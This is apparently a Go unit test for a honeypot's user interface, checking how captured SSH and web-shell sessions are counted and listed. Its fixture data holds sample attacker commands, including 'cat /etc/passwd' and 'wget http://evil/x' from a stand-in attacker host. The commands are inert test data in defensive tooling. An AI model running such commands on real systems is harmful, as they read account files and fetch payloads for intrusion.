package ui

import (
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/event"
)

func TestBuildInteractions(t *testing.T) {
	now := time.Now().UTC()
	evs := []*event.Event{
		{ // ssh shell session with commands + a recorded cast
			ID: "1", Time: now, Handler: "ssh_interactive", Source: event.Endpoint{IP: "1.1.1.1"},
			Meta: map[string]any{
				"shell_commands": []string{"uname -a", "cat /etc/passwd", "wget http://evil/x"},
				"session_cast":   "1_1.1.1.1.cast",
			},
		},
		{ // fake web shell command
			ID: "2", Time: now.Add(-time.Minute), Handler: "http", Source: event.Endpoint{IP: "2.2.2.2"},
			Meta: map[string]any{"webshell_cmd": "id"},
		},
		{ // non-interaction event (should be ignored)
			ID: "3", Time: now, Handler: "http", Source: event.Endpoint{IP: "3.3.3.3"},
			Meta: map[string]any{"http_uri": "/"},
		},
	}
	v := buildInteractions(evs)
	if v.Empty {
		t.Fatal("view marked empty despite captured work")
	}
	if v.Total != 2 {
		t.Errorf("interactions = %d; want 2 (the recon-only http event excluded)", v.Total)
	}
	if v.Commands != 4 { // 3 shell + 1 webshell
		t.Errorf("commands = %d; want 4", v.Commands)
	}
	if v.Sources != 2 {
		t.Errorf("sources = %d; want 2", v.Sources)
	}
	// Newest first; the ssh session carries its cast + command list.
	if len(v.Rows) == 0 || v.Rows[0].Kind != "shell" || v.Rows[0].Cast != "1_1.1.1.1.cast" {
		t.Fatalf("first row wrong: %+v", v.Rows)
	}
	if len(v.Rows[0].Commands) != 3 {
		t.Errorf("ssh row commands = %v; want 3", v.Rows[0].Commands)
	}
	// Empty input -> empty view.
	if !buildInteractions(nil).Empty {
		t.Error("nil events should yield an empty view")
	}
}
